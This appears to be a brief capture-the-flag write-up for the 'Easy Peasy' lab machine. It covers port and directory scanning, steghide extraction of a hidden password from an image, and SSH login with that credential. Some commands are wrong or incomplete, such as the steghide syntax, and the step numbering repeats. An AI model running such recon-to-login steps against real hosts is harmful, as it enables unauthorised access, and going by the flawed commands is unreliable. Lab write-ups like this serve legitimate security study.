# Penetration Test Report - [Easy Peasy]
- Date: 21-07-2025

## Target Information
**Machine Name**: kral4
**Ip Address**: 10.10.99.131
**Platform**: Linux
**Categorie**: CTF

## Tools Used
- Nmap
- gobuster
- Steghide
- LinPEAS

---

## Step 1 | Nmap
'''bash
nmap -sC -sT -p- -oN espscan.txt 10.10.99.131
'''
- **Findings:**
Port 80/tcp http
Port 6498/tcp
Port 65524/tcp

## Step 2 | Gobuster
'''bash
gobuster dir -u http://10.10.99.131/
'''
- **Findings:**
/hidden
/robots.txt
/index.html

Again
'''bash
gobuster dir -u http://10.10.99.131/hidden
'''
- **Findings:**
/whatever
/index.html

## Step 3 | Go To Found Address
**Adress:** http://10.10.99.131/n0th1ng3ls3m4tt3r
- Download to image.

## Step 4 | Steghide
'''bash
steghide -sh binarycodepixabay.jpg
'''
Output: "created secret.txt"

- Read The .txt File:
'''bash
cat secret.txt
'''
- Output: "(binary text: iconvertedmypasswordtobinary)"

## Step 4 | Connect To SSH
'''bash
ssh boring@10.10.99.131 -p 6498
password: iconvertedmypasswordtobinary
'''




